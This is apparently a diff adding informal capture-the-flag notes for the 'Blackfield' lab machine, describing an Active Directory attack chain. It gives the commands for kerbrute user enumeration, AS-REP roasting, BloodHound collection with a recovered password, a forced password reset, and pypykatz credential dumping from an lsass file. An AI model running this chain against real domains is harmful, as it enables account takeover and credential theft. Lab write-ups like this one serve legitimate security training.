@@ -1,0 +1,45 @@
+we did everything , rpcc ,kerberosetc with null password and username and got nothing \
+
+Smb was open for non authenticated users
+
+all fileanmes were username
+
+we used  `cat tmp | awk '{print $1}' | awk -F '\]'| awk -F '\[' '{print $2}'`
+
+we got many usernames so to confirm which username is
+
+`kerbrute -domain blackfield.local -users users.txt -dc-ip 10.10.10.192`
+
+we did ./kerbrute
+
+and to get hash of confirmed user we did Getnpusers.py
+
+`GetNPUsers.py blackfield.local/support -dc-ip 10.10.10.192 -no-pass`
+
+we got password for support
+
+if we log in rpccclient we get other many users
+
+we ran all the same commands for new users but no luck
+
+now we had password and username so we can bloodhound.py on it and we get success in it
+
+`bloodhound.py -d blackfield.local -u support -p '#00^BlackKnight' -g DC01.blackfield.local -c all -ns 10.10.10.192`
+
+it said we can change password of audit so we logged in rpcclinet and
+
+`setuserinfo2 audit2020 23 Password123`
+
+it had password complexity
+
+and we logged on smb and got ==lsass==.zip file with on using ==pypykzt== we dumped it and got cred for svc_backup
+
+`pypykatz lsa minidump lsass.DMP `
+
+we got user flag
+
+now the priv esc was Sebackupprivilage
+
+https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960
+
+read it it have all methods
